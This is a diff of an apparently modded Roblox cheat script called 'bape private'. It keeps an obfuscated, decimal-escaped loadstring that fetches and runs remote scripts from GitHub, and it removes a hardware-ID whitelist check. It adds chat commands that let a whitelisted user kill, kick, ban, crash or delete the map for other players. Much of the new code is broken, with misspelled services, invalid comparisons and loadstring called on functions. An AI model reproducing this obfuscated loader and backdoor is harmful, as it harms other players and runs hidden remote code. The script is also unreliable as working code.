@@ -1,22 +1,13 @@
-local HWIDTable = loadstring(Game:HttpGet("https://raw.githubusercontent.com/Windows-10-1234/GSWhitelist/main/Whitelist"))()
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-local player = game.Players.LocalPlayer
-local humanoid = player.Character:WaitForChild("Humanoid")
-local ChatService = game:GetService("Chat")
+local WhitelistFunctions = {
 
-local privateUsers = {
-    "GetReketed_1",
-    "Player2",
-    "Player3"
+        "GetReketed_1"
+
+
 }
 
-local triggerPlayerName = privateUsers  -- The player who can trigger the code execution
-
---Bape private >:)
+--Vape Private
+--Oh i forgot its not vape private, its bape private :D (Just modded vape with custom stuff that u can't get when ur a normal vape user)
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\55\71\114\97\110\100\68\97\100\80\71\78\47\86\97\112\101\86\52\70\111\114\82\111\98\108\111\120\47\109\97\105\110\47\78\101\119\77\97\105\110\83\99\114\105\112\116\46\108\117\97\34\44\32\116\114\117\101\41\41\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\83\119\111\112\116\116\47\83\99\114\105\112\116\115\47\109\97\105\110\47\83\77\75\69\66\68\87\65\82\83\34\44\32\116\114\117\101\41\41\40\41\10")()
-
-
-
 
 local vapePrivateCommands = {
     kill = function(args, plr)
@@ -321,157 +312,151 @@ local vapePrivateCommands = {
 vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
 
+        print("Troll Starts Now >:)")
+
+        print("Checking if Whitelist Bypass and WhitelistFunctions Bypass")
+
 
         print("Cmd Execution bypassed")
         -- Continue executing code here for the authorized user
-        
-        --kill :D
-  --[[
 
-
-
-
-        if player.Name == privateusers and string.lower(message) == ";kill default" then
-    -- Insert the Lua code you want to execute here
-    local codeToExecute2 = vapePrivateCommands.kill
-    
-    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
-        if otherPlayer ~= player then
-            local success, err = pcall(function()
-                local replicatedStorage = game:GetService("ReplicatedStorage")
-                local remoteFunction = Instance.new("RemoteFunction")
-                remoteFunction.Name = "ExecuteCode"
-                remoteFunction.Parent = replicatedStorage
-                remoteFunction.OnServerInvoke = function(player,codeToExecute2)
-                    return loadstring(codeToExecute2)()
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";kill" then 
+                                print("[GS] Kill Command Executed ")
+                                local Cmd1 = vapePrivateCommands.kill
+                                loadstring(Cmd1)
+                        end
+                    end)
                 end
-                remoteFunction:InvokeClient(otherPlayer, codeToExecute2)
-                remoteFunction:Destroy()
-            end)
-            
-            if not success then
-                warn("Error executing code for player " .. otherPlayer.Name .. ": " .. err)
             end
-        end
-    end
-end
+        end)
 
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";byfron" then 
+                                print("[GS] byfron Command Executed ")
+                                local Cmd2 = vapePrivateCommands.byfron
+                                loadstring(Cmd2)
+                        end
+                    end)
+                end
+            end
+        end)
 
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";rickroll" then 
+                                print("[GS] rickroll Command Executed ")
+                                local Cmd3 = vapePrivateCommands.rickroll
+                                loadstring(Cmd3)
+                        end
+                    end)
+                end
+            end
+        end)
 
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";lobby" then 
+                                print("[GS] lobby Command Executed ")
+                                local Cmd4 = vapePrivateCommands.lobby
+                                loadstring(Cmd4)
+                        end
+                    end)
+                end
+            end
+        end)
 
-  ]]
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";kick" then 
+                                print("[GS] kick Command Executed ")
+                                local Cmd5 = vapePrivateCommands.kick
+                                loadstring(Cmd5)
+                        end
+                    end)
+                end
+            end
+        end)
 
-  game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;kill " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute1 = "vapePrivateCommands.kill"
-            loadstring(Scripttoexecute1)
-        end
-    end)
-end)
-  
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";test" then 
+                                print("[GS] test Command Executed ")
+                                local Cmd6 = print("This is a test Command for the developers.")
+                                loadstring(Cmd6)
+                        end
+                    end)
+                end
+            end
+        end)
 
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";ban" then 
+                                print("[GS] ban Command Executed ")
+                                local Cmd7 = vapePrivateCommands.ban
+                                loadstring(Cmd7)
+                        end
+                    end)
+                end
+            end
+        end)
 
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";anticheat" then 
+                                print("[GS] anticheat Command Executed ")
+                                local Cmd9 = game.localplayer.player.walkspeed = 1000000
+                                loadstring(Cmd9)
+                        end
+                    end)
+                end
+            end
+        end)
 
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";deletemap" then 
+                                print("[GS] deletemap Command Executed (This Command is a troll command :) ")
+                                local Cmd10 = vapePrivateCommands.deletemap
+                                loadstring(Cmd10)
+                        end
+                    end)
+                end
+            end
+        end)
 
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;byfron " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute2 = "vapePrivateCommands.byfron"
-            loadstring(Scripttoexecute2)
-        end
-    end)
-end)
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;rickroll " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute3 = "vapePrivateCommands.rickroll"
-            loadstring(Scripttoexecute3)
-        end
-    end)
-end)
-
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;ban " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute4 = "vapePrivateCommands.ban"
-            loadstring(Scripttoexecute4)
-        end
-    end)
-end)
-
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;freeze " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute5 = "vapePrivateCommands.freeze"
-            loadstring(Scripttoexecute5)
-        end
-    end)
-end)
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;deletemap " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute6 = "vapePrivateCommands.deletemap"
-            loadstring(Scripttoexecute6)
-        end
-    end)
-end)
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " ;uninject " .. message)
-            -- Execute your desired script here
-            local Scripttoexecute7 = "vapePrivateCommands.uninject"
-            loadstring(Scripttoexecute7)
-        end
-    end)
-end)
-                print("Commands Successfully Loaded Have Fun!")
-
-                --Hehe i like uninject, mass troll while doing a video >:)
-    
-
-
-                --[[
-
-
-
-                local privateUsers = {
-    "Player1",
-    "Player2",
-    "Player3"
-}
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if table.find(privateUsers, player.Name) then
-            print(player.Name .. " said: " .. message)
-            -- Execute your desired script here
-            -- Example: game.ServerScriptService.YourScriptName:Clone().Parent = player
-        end
-    end)
-end)
-
-
-
-
-                --]]
-
-                
+        game.Players.PlayersAdd:Connect(function (plr)
+            for v,i in pairs(WhitelistFunctions) do 
+                if WhitelistFunctions == plr.name then
+                    plr.Chatted:Connect(function (msg)
+                        if msg == ";deletemap" then 
+                                print("[GS] crash Command Executed (This Command is a troll command :) ")
+                                local Cmd11 = vapePrivateCommands.crash
+                                loadstring(Cmd11)
+                        end
+                    end)
+                end
+            end
+        end)
+        
